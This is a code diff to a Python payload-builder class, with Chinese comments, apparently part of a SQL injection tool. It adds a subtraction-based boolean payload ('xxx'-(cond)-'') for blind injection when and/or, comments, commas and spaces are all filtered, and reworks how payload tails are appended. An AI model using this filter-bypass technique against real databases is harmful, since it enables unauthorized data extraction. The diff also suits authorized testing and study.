@@ -52,6 +52,12 @@ class PayloadBuilder:
         数字型 1^(cond)：真→0（无行），假→保持基线值。^ 无需空格分隔。"""
         return f"^({cond})"
 
+    def logic_arith(self, cond: str) -> str:
+        """减法布尔连接（「都过滤了」类：and/or/||/&&/#/--/逗号/空格全被滤）。
+        'xxx'-(cond)-''：字符串数值化为 0，表达式为 0 时匹配全部行
+        （字符串列逐行数值化比较），cond 为 0/1 → 两态页面可分。"""
+        return f"-({cond})"
+
     # ------------------------------------------------------------------ transform
     def transform(self, sql: str) -> str:
         """按实测形态变换核心 SQL（空格被滤时切换括号/tab/内联）。"""
@@ -85,8 +91,7 @@ class PayloadBuilder:
             core_t = self.transform(core)
             if core_t[:1].isalpha() or core_t[:1] == ";":
                 pre += form_sep(form)
-        tail = self.inj.comment if self.inj.comment not in ("quote-close", "none") else ""
-        return pre + self.transform(core) + tail
+        return pre + self.transform(core) + self.inj.tail_literal()
 
     def union_row(self, exprs: list) -> str:
         """构造 union select 一行（exprs 为各列表达式，null 占位）。"""
